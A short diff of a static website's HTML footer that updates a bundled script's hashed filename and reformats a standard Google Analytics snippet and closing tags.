 <script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
-<script type=text/javascript src=/js/main.min.c99b103c33d1539acf3025e1913697534542c4a5aa5af0ccc20475ed2863603b.js></script>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-177325662-1','auto'),ga('set','anonymizeIp',!0),ga('send','pageview'))</script>
-<script async src=https://www.google-analytics.com/analytics.js></script>
-</body>
-</html>
+<script type=text/javascript src=/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js></script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-177325662-1","auto"),ga("set","anonymizeIp",!0),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></body></html>
